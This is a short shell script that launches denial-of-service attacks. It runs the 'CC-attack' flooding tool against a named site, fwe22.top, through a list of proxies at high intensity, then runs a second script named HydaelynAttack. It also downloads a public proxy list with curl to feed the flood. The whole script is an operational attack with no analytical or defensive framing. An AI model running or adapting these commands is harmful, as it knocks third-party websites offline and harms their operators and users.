echo "CC-attack"
python3 ~/CC-attack/cc.py -url http://fwe22.top/ -f ~/proxy.txt -v 5 -s 30

echo "HydaelynAttack"
python3 ~/HydaelynAttack/HydaelynAttack_p_once_noLog.py

echo "updata proxy"
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt